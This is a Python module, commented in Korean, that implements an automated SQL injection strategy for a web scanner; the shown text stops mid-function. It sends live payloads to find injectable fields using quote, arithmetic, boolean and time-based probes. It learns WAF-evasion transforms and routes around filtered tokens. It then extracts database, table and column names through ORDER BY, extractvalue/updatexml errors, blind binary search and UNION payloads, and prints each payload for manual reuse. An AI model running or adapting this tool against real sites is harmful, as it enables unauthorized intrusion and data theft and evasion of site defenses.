import concurrent.futures
import re
import string
import time

import requests

from fbs.inference.models import AttackSurface, VulnResult
from fbs.inference.waf import classify_waf_block, try_evade, visible_text, diff_score, apply_named_evasion, EVASION_TRANSFORMS
from fbs.inference.sql_dialects import SQL_DIALECTS, DIALECT_PROBE_ORDER, ERROR_SIGNATURES, detect_db_from_error
from fbs.inference.strategies.base import BaseStrategy

"""
web_scanner/pipelines/sqli.py를 포팅한 SQLi strategy.

원본은 Scrapy 콜백 체인(yield Request(callback=...))으로 짜여 있었지만,
여기서는 InferenceEngine이 크롤링이 끝난 뒤 동기적으로 requests.Session을
돌리는 구조에 맞춰 콜백 체인을 순차 호출로 펼쳐서 옮겼다. 페이로드·판정
로직·전체 시퀀스는 원본과 동일하다.

원본은 항상 '(홑따옴표)만 breaking 문자로 썼지만, 여기서는 recon이 찾아낸
문맥(surface.extra['quote_char'])을 그대로 물려받아 전체 페이로드를 구성한다.
recon 신호가 없으면(quote_char=None) 기존과 동일하게 '를 기본값으로 쓴다.

시퀀스 (앞 단계에서 확정되면 뒤는 건너뜀. quote_probe/error_time의 status-only 약한
신호는 즉시 확정하지 않고 보류했다가, 끝까지 아무것도 안 잡히면 최후 수단으로 씀):
  baseline → quote_probe → [arithmetic(숫자형)] → noise+boolean(저렴함, 우선 시도)
  → error/time(DB별 순차, boolean이 실패했을 때만) → [status-only fallback]
확정 후 공격벡터 확인:
  enumerate(ORDER BY 컬럼수 + error 기반 DB명→테이블→컬럼)
  → Boolean-based로 잡혔으면 이진 탐색으로 database() blind 추출
  → [union reflect] → [union extract]
"""


class SQLiStrategy(BaseStrategy):

    VULN_TYPE = 'sqli'
    TIMEOUT = 10
    TIME_TIMEOUT = 15

    UNION_MARKER   = 'sqli7e7esqli'
    MAX_UNION_COLS = 10

    # blind 이진 탐색용 문자 후보 (DB/테이블/컬럼 식별자는 보통 이 범위 안이라 32~126 전체보다 좁게 잡음).
    BLIND_CHARSET  = sorted(ord(c) for c in string.ascii_letters + string.digits + '_')
    BLIND_MAX_LEN  = 64
    # BETWEEN 기반 밴-안전 비교의 상한 — LENGTH/ASCII 값은 이보다 훨씬 작아 'x > n'을
    # 부등호 없이 'x BETWEEN n+1 AND 이 값'으로 표현할 수 있다('<'/'>'가 밴인 타깃 대응).
    BLIND_MAX_INT  = 4294967295

    # boolean 탐지에서 한 번에 동시 전송할 (true, false) 쌍 개수. 배치 안은 병렬, 배치 사이는
    # 순차라서 신호를 찾으면 다음 배치로 안 넘어간다 — early-stop을 배치 단위로만 유지한다.
    BOOLEAN_BATCH_SIZE = 4

    # time-based로 확정됐을 때 db_name(_db_payloads의 키)에서 (방언, 연결어, 시간함수 종류)를
    # 뽑는 표. 시간 기반 blind 추출이 어떤 방언·연결어·지연함수로 조건부 지연을 만들지 정하는 데
    # 쓴다. 방언은 SQL_DIALECTS의 키와 동일 표기 — SQLite엔 지연함수가 없어 여기 없고, MSSQL/
    # Oracle은 SQL_DIALECTS(문자 추출 문법)에 없어 추출은 스킵되지만 방언 표시용으로 남겨둔다.
    _TIME_PROFILE = {
        'MySQL_OR':            ('MySQL',      'OR',  'sleep'),
        'MySQL_AND':           ('MySQL',      'AND', 'sleep'),
        'MySQL_OR_BENCHMARK':  ('MySQL',      'OR',  'benchmark'),
        'MySQL_AND_BENCHMARK': ('MySQL',      'AND', 'benchmark'),
        'PostgreSQL':          ('PostgreSQL', 'AND', 'pg_sleep'),
        'MSSQL':               ('MSSQL',      '',    'waitfor'),
        'Oracle':              ('Oracle',     'AND', 'dbms_pipe'),
    }

    # 멱등성 프로브: 같은 benign 요청을 몇 번 순차로 보내 statefulness/노이즈를 재는지.
    # 5로 잡은 이유 — 로그인 폼의 '5회 실패 후 리셋' 같은 누적 상태 임계값을 실제로 넘겨봐야
    # 상태 전이가 드러나기 때문(2회로는 카운터가 신선할 때 0으로만 보임).
    IDEMPOTENCY_PROBES = 5
    # 첫 응답 대비 최대 diff가 이 값을 넘으면 stateful(비멱등)로 본다. _probe_boolean이 이미
    # 쓰던 '너무 시끄러움' 바(30)와 동일 — 정상 세션토큰 잡음은 보통 그 아래, 페이지 전체가
    # 다른 페이지로 바뀌는 상태 전이는 그 위.
    STATEFUL_NOISE_THRESHOLD = 30

    def __init__(self, session: requests.Session | None = None):
        self.session = session or requests.Session()
        # (surface.url, surface.param, payload_shape) -> 최근 성공한 EVASION_TRANSFORMS 기법
        # 이름. 같은 필드라도 payload_shape(quote/boolean/error-time/blind/fingerprint 등)에
        # 따라 페이로드 구조 자체가 달라서(따옴표 단독 vs AND/OR 대칭쌍 vs SLEEP 서브쿼리)
        # 같은 우회 기법이라도 통하는지 여부가 갈릴 수 있다 — field 단위로만 캐싱하면 boolean
        # 에서 배운 기법이 error/time에 잘못 재사용되거나(실패), 반대로 재사용 자체를 못 해서
        # 비효율이 생긴다. shape별로 따로 캐싱해야 "이 필드의 이 종류 페이로드엔 이 기법"이라는
        # 정확한 학습이 된다.
        self._evasion_cache: dict[tuple, str] = {}
        # (surface.url, surface.param) -> blind 추출에서 확인된 DB 방언 이름
        # (SQL_DIALECTS의 키). 필드당 한 번만 판별하고 이후 재사용한다.
        self._dialect_cache: dict[tuple, str] = {}
        # (surface.url, surface.param) -> quote_char가 이 필드에서 우회 불가로 확인됐는지.
        # run()의 quote/boolean/error-time 체인이 확정한 값을 여기 기록해두면, 이후
        # _go_enumerate 쪽(UNION reflect 등)에서도 "quote_char는 이미 우회 안 된다"는 걸
        # 참고할 수 있다 — 단, 여기서도 각 단계는 자기 자신의 첫 시도는 반드시 직접 해보고,
        # 그것도 실패했을 때만(이 값 + 자기 확인, 두 증거가 겹칠 때만) 나머지를 스킵한다.
        self._quote_signal: dict[tuple, bool] = {}
        # (surface.url, surface.param) -> scanner.py가 hidden_param 발견 당시 WAF 차단을
        # 우회하는 데 썼던 EVASION_TRANSFORMS 기법 이름(profiler가 surface.extra
        # ['discovery_evasion']으로 넘겨줌). shape별 _evasion_cache가 아직 비어있는
        # 첫 차단 시점에 전체 탐색 대신 이 기법부터 1번 시도해보는 용도 — 발견 당시
        # 페이로드가 sqli.py의 특정 payload_shape와 정확히 안 맞을 수 있어서 shape별로는
        # 못 넣고 필드 단위로만 넣어둔다.
        self._discovery_evasion_hint: dict[tuple, str] = {}
        # (surface.url, surface.method) -> (stateful, page_noise, trace). 멱등성 프로브 결과를
        # 엔드포인트 단위로 캐싱한다 — statefulness는 필드가 아니라 엔드포인트의 성질이라 같은
        # 폼의 여러 필드(예: username/password)가 재사용한다.
        self._idempotency: dict[tuple, tuple] = {}
        # (surface.url, surface.param) -> recon filter_map에서 밴으로 확인된 토큰 집합.
        # 페이로드 사전검열(밴 토큰 회피)과 차단 판정(payload-aware)에 쓴다.
        self._banned_tokens: dict[tuple, set] = {}

    # ── BaseStrategy 인터페이스 ──────────────────────────────────────────────

    def can_handle(self, surface: AttackSurface) -> bool:
        if surface.surface_type not in ('form_field', 'url_param', 'hidden_param', 'api_field'):
            return False
        hints = surface.extra.get('hints', {})
        return hints.get('sqli', 0.0) > 0

    def run(self, surface: AttackSurface) -> list[VulnResult]:
        if surface.extra.get('proxy_template'):
            print("    [SQLi] JSON 프록시 폼은 아직 미지원 — 스킵")
            return []

        quote_char = surface.extra.get('quote_char') or "'"
        if surface.extra.get('quote_char'):
            print(f"    [SQLi] recon이 찾은 따옴표 문맥 재사용: {quote_char!r}")

        known_dialect = surface.extra.get('detected_db')
        if known_dialect:
            print(f"    [SQLi] recon이 에러 시그니처로 찾은 DB 재사용: {known_dialect!r}")

        discovery_evasion = surface.extra.get('discovery_evasion')
        if discovery_evasion:
            self._discovery_evasion_hint[(surface.url, surface.param)] = discovery_evasion
            print(f"    [SQLi] hidden 파라미터 발견 당시 우회 기법 재사용 준비: {discovery_evasion!r}")

        # recon이 거부-지문으로 학습한 밴 토큰 집합. 페이로드 사전검열(회피)과 차단 판정
        # (payload-aware)에 쓴다 — 밴 토큰이 든 페이로드는 필터 거부가 확실하고, 우리 우회
        # 변형으로 그 키워드를 못 없애면 요청을 낭비하지 않는다.
        filter_map = surface.extra.get('filter_map') or {}
        banned = {t for t, b in filter_map.items() if b}
        if banned:
            self._banned_tokens[(surface.url, surface.param)] = banned
            print(f"    [SQLi] recon 필터 지도: 밴 토큰 {sorted(banned)} — 페이로드 회피/차단 판정에 사용")

        base_fields    = self._base_fields(surface)
        original_value = base_fields.get(surface.param, 'test')

        baseline_status, baseline_body, baseline_elapsed = self._send(surface, base_fields)
        if baseline_status is None:
            print("    [SQLi] baseline 요청 실패 — 스킵")
            return []

        # 멱등성 프로브 — 이 엔드포인트가 stateful(시도 카운터/리셋/해커 감지 등으로 요청마다
        # 응답이 바뀜)인지 판정하고, 페이지의 진짜 요청별 변동폭(page_noise)을 잰다. stateful이면
        # content 기반 판정(boolean/content-blind)을 끄고 시간 기반 오라클로 전환한다. baseline_body를
        # 첫 샘플로 재사용하며, 결과는 (url, method)로 캐싱돼 같은 폼의 다른 필드가 재사용한다.
        stateful, page_noise, idem_trace = self._probe_idempotency(surface, base_fields, baseline_body)

        # status만 바뀌고 본문 증거가 없는 약한 신호는 바로 확정 짓지 않고 보류해둔다 —
        # boolean 등 더 확실한 신호를 계속 찾아보고, 끝까지 아무것도 없으면 최후 수단으로 쓴다.
        fallback_entry = None

        def _confirm(candidate: dict | None) -> dict | None:
            nonlocal fallback_entry
            if candidate is None:
                return None
            if candidate.get('evidence_kind') == 'status':
                if fallback_entry is None:
                    fallback_entry = candidate
                return None
            return candidate

        # WAF에 차단된 페이로드(waf_hits)와 우회에 성공한 페이로드(waf_evasions)를 모아뒀다가
        # 탐지 요약에 같이 보여준다 — 최종 확정에 안 쓰인 probe의 우회 시도도 놓치지 않기 위함.
        waf_hits: list[str] = []
        waf_evasions: list[str] = []

        # quote_char(따옴표) 자체가 이 필드에서 우회 불가로 확인되면(quote probe든, boolean/
        # error-time의 첫 quote 포함 페이로드든) 이후 quote_char를 담은 페이로드는 결과가
        # 뻔해서(EVASION_TRANSFORMS·조합 전부 이미 시도해봤자 또 막힘) 요청 자체를 안 보내고
        # 스킵한다. run() 하나(필드 하나) 안에서만 유효한 상태라 지역 dict로 스레딩한다.
        quote_signal = {'hopeless': False}

        vuln_entry = None
        # hidden_param은 크롤링 때 실제 값을 본 적이 없어서(_base_fields가 항상 'test'로
        # 채움) 원본 값 기반 판별(quote_probe 이하 체인)보다 먼저, 원본 값 없이도 숫자형
        # 여부를 확인할 수 있는 괄호 짝 문법 비대칭 테스트를 우선 시도한다. 숫자형+SQL
        # 파싱으로 확정되면 quote_probe/boolean 같은 문자열 지향 탐지는 방향 자체가
        # 틀려서 생략하고 바로 이 결과를 채택한다.
        if surface.surface_type == 'hidden_param':
            vuln_entry = self._probe_hidden_syntax_break(surface, base_fields, waf_hits, waf_evasions)
            if vuln_entry:
                print(f"    [Type] hidden 필드 — 괄호 짝 테스트로 숫자형 확정, "
                      f"문자열 지향 탐지(quote_probe 등) 생략")

        if vuln_entry is None:
            vuln_entry = _confirm(self._probe_quote(surface, base_fields, baseline_status, baseline_body, quote_char, waf_hits, waf_evasions, quote_signal))

        # quote_probe 성공 여부와 무관하게 숫자형 재확인은 항상 시도한다 — 따옴표 하나는
        # 숫자형 unquoted 컨텍스트도 깨뜨려서(id = ' 도 문법 오류), quote_probe "성공"이
        # 문자열형 컨텍스트라는 증거는 못 된다. arithmetic이 성공하면(등가성 비교라 더
        # 구체적인 증거) 존재 확정 자체는 그대로 유지한 채 컨텍스트 판정만 arithmetic
        # 쪽으로 교체한다 — 안 그러면 실제 숫자형 필드가 문자열형으로 잘못 확정돼
        # 이후 %{quote_char} 접두사가 붙은 페이로드가 전부 깨진 채로 나간다.
        if str(original_value).isdigit():
            arithmetic_entry = self._probe_arithmetic(surface, base_fields, baseline_body, original_value)
            if arithmetic_entry:
                if vuln_entry and vuln_entry.get('detected_db') not in (None, 'Unknown'):
                    arithmetic_entry['detected_db'] = vuln_entry['detected_db']
                vuln_entry = arithmetic_entry

        # boolean이 error/time보다 훨씬 저렴하고(SLEEP 대기 없음), 여기서 잡히면 이진 탐색
        # 추출까지 바로 붙는다 — 그래서 먼저 시도한다. 다만 stateful 타깃에선 참/거짓 본문
        # 차이가 SQL 평가가 아니라 앱 상태(카운터/리셋/해커 감지)에서 나와 신뢰 불가라, boolean을
        # 건너뛰고 상태와 무관한 물리 오라클(error/time)로 직행한다.
        if vuln_entry is None and stateful:
            print(f"    [Stateful] 타깃이 stateful(trace={idem_trace}) — content 기반 boolean 탐지는 "
                  f"신뢰 불가라 스킵, error/time으로 직행")
        elif vuln_entry is None:
            vuln_entry = self._probe_boolean(surface, base_fields, baseline_body, original_value, quote_char, waf_hits, waf_evasions, quote_signal, page_noise)

        if vuln_entry is None:
            vuln_entry = _confirm(self._probe_error_time(surface, base_fields, baseline_status, baseline_elapsed, quote_char, waf_hits, waf_evasions, quote_signal, known_dialect=known_dialect))

        if vuln_entry is None and fallback_entry is not None:
            print(f"    [Fallback] 본문 증거도 boolean/error/time 확정도 없음 — 상태코드 변화만으로 "
                  f"의심 신호 채택(확정 아님): {fallback_entry['type']}")
            vuln_entry = fallback_entry

        if vuln_entry is None:
            if waf_hits:
                print(f"    [SQLi] 취약점 미확정 — WAF가 {len(waf_hits)}개 페이로드를 차단해서 판단 불가했음 (수동 확인 권장)")
            return []

        vuln_entry['waf_hits'] = waf_hits
        vuln_entry['waf_evasions'] = waf_evasions
        vuln_entry['stateful'] = stateful
        vuln_entry['idem_trace'] = idem_trace
        # quote_probe/boolean/arithmetic 중 dialect를 못 알아낸 경로로 확정됐으면
        # (detected_db가 비어있거나 'Unknown') recon이 이미 알아낸 값으로 채워서,
        # _blind_extract_boolean의 _resolve_dialect가 known_db로 재사용해 재프로빙을
        # 건너뛸 수 있게 한다.
        if known_dialect and vuln_entry.get('detected_db') in (None, 'Unknown'):
            vuln_entry['detected_db'] = known_dialect
        # _go_enumerate(UNION reflect 등)가 참고할 수 있게, 여기까지 확정된 quote_char
        # hopeless 여부를 필드별 상태로 넘겨둔다 — arithmetic/fallback으로 확정된 경우
        # quote_char는 한 번도 안 통했을 수 있는데, _go_enumerate의 probe들은 여전히
        # quote_char를 쓰기 때문이다.
        self._quote_signal[(surface.url, surface.param)] = quote_signal['hopeless']

        # 필드가 숫자형(_probe_arithmetic 또는 _probe_hidden_syntax_break)으로 확정됐으면,
        # 이후 열거/추출 페이로드는 따옴표로 문자열을 깨고 나오는 접두사(%')가 아니라
        # 순수 숫자 필러를 써야 한다 — 숫자형 필드에 굳이 따옴표를 붙이면 그 자체가 불필요한
        # 구조라 WAF가 따옴표 하나만 보고 차단하는 규칙이 있을 때(흔한 패턴) 우회 기법을
        # 아무리 시도해도(EVASION_TRANSFORMS는 공백/대소문자 등만 바꾸지 따옴표 자체를
        # 없애주진 않는다) 절대 못 뚫는다. _probe_arithmetic으로 확정됐으면 실제로 검증된
        # original_value를, _probe_hidden_syntax_break로 확정됐으면 그 probe가 이미 정상
        # 응답을 확인해둔 '9'를 필러로 재사용한다.
        enum_baseline_status, enum_baseline_body = baseline_status, baseline_body
        if vuln_entry['type'].startswith('Arithmetic-based SQL Injection'):
            numeric_filler = str(original_value) if str(original_value).isdigit() else '9'
            injection_prefix = numeric_filler
            print(f"    [SQLi] 숫자형 컨텍스트로 확정 — 이후 페이로드는 따옴표 없이 "
                  f"원시 숫자 접두사({injection_prefix!r})를 씀")
            # _probe_arithmetic/_probe_hidden_syntax_break 둘 다 확정 페이로드에 comment를
            # 전혀 안 쓰고도 성공했다 — 인젝션 지점 뒤에는 원래 아무것도 안 남는다는 뜻이라,
            # dialect도 comment 없이 판별해서 comment 자체가 필요 없다는 걸 같이 증명한다.
            comment, fresh_status, fresh_body = self._probe_numeric_comment(
                surface, base_fields, injection_prefix, vuln_entry, waf_hits, waf_evasions,
            )
            # _go_enumerate의 baseline도 이 fresh 응답으로 바꾼다 — 맨 처음 캡처한
            # baseline_body는 placeholder('test')로 받은 거라, level처럼 따옴표 없이 그대로
            # 꽂히는 숫자형 컬럼에서는 'test'가 존재하지 않는 컬럼 참조로 파싱돼 그 자체가
            # 에러 응답일 수 있다(baby-sqlite에서 실제 확인: level=test → "no such column:
            # test" → "Error!"). 그 stale하고 잠재적으로 이미 깨진 baseline과 비교하면
            # ORDER BY 등의 판정이 통째로 뒤집힌다. injection_prefix 단독 응답(확실히 유효한
            # 값)이 있으면 그걸로 교체하고, 못 구했으면(fresh_status is None) 안전하게 기존
            # 것을 유지한다.
            if fresh_status is not None:
                enum_baseline_status, enum_baseline_body = fresh_status, fresh_body
            else:
                print(f"    [SQLi] fresh baseline 확보 실패 — 기존 placeholder 기반 baseline 유지(신뢰도 낮을 수 있음)")
        else:
            triggering = vuln_entry.get('true_payload') or vuln_entry.get('payload', '')
            # %는 LIKE 패턴 컨텍스트(검색창 등)에서나 필요한 관례일 뿐, 이 필드가 등호(=)
            # 비교처럼 %없이도 이미 확정됐다면 % 자체가 불필요한 문자다. %를 무조건 붙이면,
            # %가 필터링되는 사이트(이 세션에서 실제로 발견: SQL_BAN_LIST에 %가 있는 앱)에서
            # 확정 이후의 모든 enumerate/blind 페이로드가 전부 필터에 걸려서 매번 같은 거부
            # 응답만 받게 된다(실측: order_results 전부 동일값, 캘리브레이션 diff=0으로
            # 헛돎). 확정에 실제로 성공한 페이로드가 %로 시작했는지를 그대로 재사용한다 —
            # quote_probe/error_time 등 %를 아예 안 쓰는 경로로 확정된 경우도 이걸로 커버됨.
            injection_prefix = quote_char if not triggering.startswith('%') else f"%{quote_char}"
            # 확정 페이로드가 실제로 어떤 comment로 성공했는지(--, #) 그대로 재사용한다 —
            # 어느 쪽인지 확인 안 되면 3개 방언(SQLite/MySQL/PostgreSQL) 공통인 --를 기본값
            # 으로 쓴다(#는 MySQL 전용이라 다른 방언에서 그 자체가 구문 오류를 낼 수 있다).
            # MySQL은 --가 뒤에 공백(또는 제어문자)이 없으면 주석으로 인식하지 않으므로
            # ('-- '와 '--foo'는 다르게 취급됨), comment 값 자체에 공백을 포함시켜서 어느
            # 호출부에서 갖다 써도 항상 안전하게 만든다.
            stripped = triggering.rstrip()
            if stripped.endswith('--'):
                comment = '-- '
            elif stripped.endswith('#'):
                comment = '#'
            else:
                comment = '-- '

        self._go_enumerate(surface, base_fields, enum_baseline_body, enum_baseline_status, vuln_entry,
                            injection_prefix, comment, waf_hits, waf_evasions,
                            page_noise=page_noise, stateful=stateful)
        self._print_summary(surface, quote_char, vuln_entry)
        return [self._to_vuln_result(surface, vuln_entry)]

    @classmethod
    def _clean_dialect(cls, vuln_entry: dict) -> str | None:
        """vuln_entry['detected_db']를 사람이 읽을 깔끔한 방언 이름으로 정규화한다 —
        time-based의 변형 이름('MySQL_OR_BENCHMARK'→'MySQL')과 fingerprint의 '(추정)'
        꼬리표를 걷어낸다. 판별된 게 없거나 'Unknown'이면 그대로 둔다."""
        raw = vuln_entry.get('detected_db') or ''
        profile = cls._TIME_PROFILE.get(raw)
        if profile:
            return profile[0]
        return raw.replace(' (추정)', '').strip() or None

    def _print_summary(self, surface: AttackSurface, quote_char: str, vuln_entry: dict) -> None:
        """탐지 방식별로 왜 이렇게 판단했는지 근거를 사람이 읽을 수 있게 출력한다."""
        vtype = vuln_entry['type']
        print(f"\n    ══ 탐지 요약 ══════════════════════════════")
        print(f"    필드      : {surface.param} ({surface.surface_type})")
        print(f"    위치      : {surface.method} {surface.url}")
        print(f"    탐지 방식 : {vtype}")
        print(f"    따옴표    : {quote_char!r}")
        db_display = self._clean_dialect(vuln_entry)
        if db_display and db_display != 'Unknown':
            print(f"    DB        : {db_display}")
        if vuln_entry.get('stateful'):
            print(f"    ⚠ 상태    : stateful 타깃(멱등성 프로브 trace={vuln_entry.get('idem_trace')}) — 같은 요청에도 "
                  f"응답이 바뀜(시도 카운터/리셋 등). content 기반 판정은 신뢰 낮아 시간 기반 오라클만 사용했고, "
                  f"자동 추출이 상태 리셋에 막힐 수 있으니 수동 확인 권장")

        if vtype == 'Error-based SQL Injection (Quote Probe)':
            self._print_error_evidence(vuln_entry, f"따옴표 하나(\"{vuln_entry['payload']}\")만 넣었는데")

        elif vtype == 'SQL Injection 의심 (미확정)':
            self._print_error_evidence(vuln_entry, f"페이로드(\"{vuln_entry['payload']}\") 주입 시")
            print(f"    주의      : 본문 증거·boolean·error·time 중 어느 것도 확정 못 함 — 상태코드 변화 "
                  f"하나뿐이라 SQL 문법 오류가 아닌 다른 원인일 가능성도 있음. 반드시 수동으로 재현/확인할 것")

        elif vtype == 'Arithmetic-based SQL Injection':
            print(f"    근거      : 페이로드 \"{vuln_entry['payload']}\"(원래 값과 수학적으로 같은 값)는 "
                  f"baseline과 길이가 거의 같고(base={vuln_entry['baseline_len']}, "
                  f"eq={vuln_entry['eq_response_len']}), 다른 값을 넣은 neq={vuln_entry['neq_response_len']}는"
                  f" 확연히 다름 — 필드값이 문자열이 아니라 실제 산술 연산되고 있다는 뜻 (따옴표 없이도 우회 가능)")

        elif vtype == 'Arithmetic-based SQL Injection (Syntax Break)':
            print(f"    근거      : hidden 필드라 원본 값을 몰라 등가 비교 대신 괄호 짝 문법 비대칭을 씀 — "
                  f"균형 잡힌 값(9, (9), ((9)))은 baseline과 응답이 비슷했고(diff={vuln_entry['balanced_diffs']}, "
                  f"threshold={vuln_entry['noise_threshold']}), 불균형 값(9), (9)은 확연히 달랐음"
                  f"(diff={vuln_entry['broken_diffs']}) — 괄호를 문법 단위로 해석하는 SQL 파서가 있다는 뜻. "
                  f"깨진 페이로드(\"{vuln_entry['payload']}\")를 한 번 더 보내 같은 차이(diff={vuln_entry['retry_diff']})"
                  f"가 재현되는 것까지 확인해 우연한 노이즈 가능성을 배제함")

        elif vtype == 'Error-based SQL Injection':
            self._print_error_evidence(
                vuln_entry, f"{vuln_entry['detected_db']}용 페이로드(\"{vuln_entry['payload']}\") 주입 시"
            )

        elif vtype == 'Time-based SQL Injection':
            waf_note = ' — WAF를 우회해서 확인함' if vuln_entry.get('waf_evaded') else ''
            print(f"    근거      : {vuln_entry['detected_db']} 계열 시간 지연 페이로드 주입 시 응답이 "
                  f"baseline({vuln_entry['baseline_duration']}s) 대비 {vuln_entry['attack_time']}s로 느려졌고,"
                  f" 곧바로 보낸 재검증 요청은 다시 {vuln_entry['verify_time']}s로 정상 — 우연한 지연이 아니라"
                  f" 페이로드가 DB에서 실제로 실행됐다는 뜻 (에러도 안 뜨고 내용도 안 바뀌는 blind 케이스에서 유효){waf_note}")

        elif vtype == 'Boolean-based SQL Injection':
            waf_note = ' — WAF를 우회해서 확인함' if vuln_entry.get('waf_evaded') else ''
            print(f"    근거      : 참/거짓 페이로드 쌍의 응답이 서로 다름 (본문 텍스트 내용 차이 기준으로 확인){waf_note}")
            print(f"                true  \"{vuln_entry['true_payload']}\" → {vuln_entry['true_response_len']}자")
            print(f"                false \"{vuln_entry['false_payload']}\" → {vuln_entry['false_response_len']}자")
            print(f"                baseline={vuln_entry['baseline_len']}자, "
                  f"page_noise={vuln_entry['page_noise']}, threshold={vuln_entry['noise_threshold']}, "
                  f"diff_chars={vuln_entry['diff_chars']}")
            print(f"                → 조건을 참/거짓으로 바꿨을 때 응답이 달라진다는 건 그 조건이 "
                  f"쿼리 로직 안에서 실제로 평가되고 있다는 뜻")

        waf_evasions = vuln_entry.get('waf_evasions') or []
        if waf_evasions:
            print(f"    WAF 우회  : {len(waf_evasions)}건 성공 — 최종 탐지에 쓰인 probe가 아니어도"
                  f" WAF가 있다는 것과 뚫린다는 것 자체가 유의미함")
            for hit in waf_evasions[:5]:
                print(f"                · {hit}")
            if len(waf_evasions) > 5:
                print(f"                · 외 {len(waf_evasions) - 5}건")

        waf_hits = vuln_entry.get('waf_hits') or []
        if waf_hits:
            print(f"    WAF 감지  : {len(waf_hits)}건 차단됨 — 아래 시도들은 WAF에 막혀서 판단 불가했음"
                  f" (실제로는 더 확실하게 탐지됐을 수 있음, 수동 확인 권장)")
            for hit in waf_hits[:5]:
                print(f"                · {hit}")
            if len(waf_hits) > 5:
                print(f"                · 외 {len(waf_hits) - 5}건")

        self._print_attack_vectors(vuln_entry.get('attack_vectors', {}))
        print(f"    ══════════════════════════════════════════")

    # 벡터 종류가 늘어나도 여기 라벨/렌더러만 추가하면 됨.
    ATTACK_VECTOR_LABELS = {
        'error_based':   'Error-based',
        'blind_boolean': 'Blind (Boolean 이진 탐색)',
        'blind_time':    'Blind (Time 이진 탐색)',
        'UNION':         'UNION',
    }

    def _print_attack_vectors(self, av: dict) -> None:
        possible = [self.ATTACK_VECTOR_LABELS.get(k, k) for k, v in av.items() if v.get('possible')]
        print(f"\n    ── 공격벡터 ──────────────────────────────")
        print(f"    가능한 공격 방식 : {', '.join(possible) if possible else '없음 (blind 방식으로만 공격 가능)'}")

        for key, label in self.ATTACK_VECTOR_LABELS.items():
            vec = av.get(key)
            if not vec or not vec.get('possible'):
                continue
            print(f"\n    [{label}]")
            if key == 'error_based':
                self._print_error_based_vector(vec)
            elif key == 'blind_boolean':
                self._print_blind_vector(vec)
            elif key == 'blind_time':
                self._print_blind_time_vector(vec)
            elif key == 'UNION':
                self._print_union_vector(vec)

    @staticmethod
    def _print_blind_vector(vec: dict) -> None:
        print(f"      사용 명령어 : LENGTH()/ASCII(SUBSTRING()) 이진 탐색 — 참/거짓 오라클로 문자 단위 추출")
        print(f"      결과        : DB명={vec.get('db_name')}")

    @staticmethod
    def _print_blind_time_vector(vec: dict) -> None:
        print(f"      사용 명령어 : IF(cond, 지연, 즉시) 조건부 시간 지연 — 응답 시간을 오라클로 문자 단위 추출")
        if vec.get('db_name'):
            print(f"      결과        : DB명={vec['db_name']}")
        else:
            print(f"      결과        : DB명 추출 실패 (방언만 확인: {vec.get('dialect')})")

    @staticmethod
    def _print_error_based_vector(vec: dict) -> None:
        print(f"      사용 명령어 : extractvalue(1,concat(0x7e,expr)) / updatexml(...) — "
              f"DB명 → 테이블 → 컬럼 순으로 확인")
        result = f"DB명={vec.get('db_name')}"
        if vec.get('table_name'):
            result += f", 테이블={vec['table_name']}"
        if vec.get('column_name'):
            result += f", 컬럼={vec['column_name']}"
        print(f"      결과        : {result}")

    @staticmethod
    def _print_union_vector(vec: dict) -> None:
        """실제로 사용된 페이로드를 그대로 보여준다 — 웹 폼에 직접 붙여넣어 재현할 수 있도록."""
        reflect = vec.get('reflected_column')
        result = f"컬럼 수={vec.get('columns')}"
        result += f", 반사 컬럼={reflect}번째" if reflect else ", 반사 컬럼 없음(blind)"
        print(f"      결과        : {result}")

        # 주의: !r(repr)로 찍으면 탭 같은 특수문자가 '\t'라는 두 글자 텍스트로 escape되어
        # 보여서, 그걸 그대로 복사해 붙여넣으면 진짜 탭이 아니라 백슬래시+t 문자가 들어가
        # 페이로드가 깨진다. 사람이 그대로 복사해서 쓸 값이니 여기서는 원문 그대로 찍는다.
        if vec.get('order_by_payload'):
            print(f"      컬럼 수 확인 페이로드 : \"{vec['order_by_payload']}\"")
            print(f"                             (이 값 넣으면 정상 응답과 달라짐 — 컬럼 수가 {vec.get('columns')}개라는 증거)")
        if vec.get('reflect_payload'):
            print(f"      반사 컬럼 확인 페이로드 : \"{vec['reflect_payload']}\"")
            print(f"                               (이 값 넣으면 화면에 마커 문자열이 그대로 보임)")

        if vec.get('db_name'):
            print(f"      DB명 추출 페이로드   : \"{vec.get('db_name_payload')}\"")
            print(f"                             → 결과: {vec['db_name']}")
        if vec.get('tables'):
            print(f"      테이블 추출 페이로드 : \"{vec.get('tables_payload')}\"")
            print(f"                             → 결과: {vec['tables']}")
        elif reflect and not vec.get('db_name'):
            print(f"      비고        : 반사 컬럼은 찾았지만 DB명/테이블 추출은 실패 "
                  f"(마커 패턴 불일치 — 수동으로 페이로드 조정하면 더 뽑아낼 수 있음)")

    @staticmethod
    def _print_error_evidence(vuln_entry: dict, lead_in: str) -> None:
        """error_in_body(실제 에러 메시지 노출)와 status_error(상태코드만 바뀜)를 구분해서 근거를 보여준다."""
        waf_note = ' — WAF를 우회해서 확인함' if vuln_entry.get('waf_evaded') else ''
        if vuln_entry.get('evidence_kind') == 'body':
            print(f"    근거      : {lead_in} 응답 본문에 {vuln_entry['detected_db']} 에러 메시지가 그대로 노출됨"
                  f" — 입력값이 필터링 없이 SQL 문법에 꽂혀서 DB 엔진이 직접 에러를 뱉었다는 뜻{waf_note}")
            if vuln_entry.get('error_snippet'):
                print(f"                에러 메시지: {vuln_entry['error_snippet']!r}")
        else:
            print(f"    근거      : {lead_in} 응답 상태가 baseline({vuln_entry['baseline_status']}) → "
                  f"probe({vuln_entry['attack_status']})로 바뀜 — 에러 메시지 자체는 화면에 안 보이지만"
                  f" 상태코드 변화로 쿼리가 깨졌다는 걸 알 수 있음 (본문은 숨겨져 있어 수동 확인 권장){waf_note}")

    @staticmethod
    def _payload_shape(label: str) -> str:
        """label에서 페이로드 '종류'만 뽑는다 — 'error/time(MySQL_OR)' → 'error/time',
        'boolean(true)'/'boolean(verify-true)' → 'boolean' 등. 캐시 키를 필드 단위가
        아니라 (필드, 종류) 단위로 좁히는 데 쓴다."""
        return label.split('(')[0]

    def _banned_in(self, surface, payload: str) -> str | None:
        """payload에 이 필드에서 밴으로 확인된 토큰(recon filter_map)이 있으면 그 토큰을 반환.
        앱 필터가 보통 그렇듯 소문자 substring 매칭으로 본다(앱의 `banned in query.lower()`와
        같은 의미) — 그래야 'order'가 어디에 있든 잡히는 앱 동작과 일치한다."""
        banned = self._banned_tokens.get((surface.url, surface.param))
        if not banned:
            return None
        low = payload.lower()
        for tok in banned:
            if tok in low:
                return tok
        return None

    def _is_refused(self, surface, payload: str, status, body: str) -> bool:
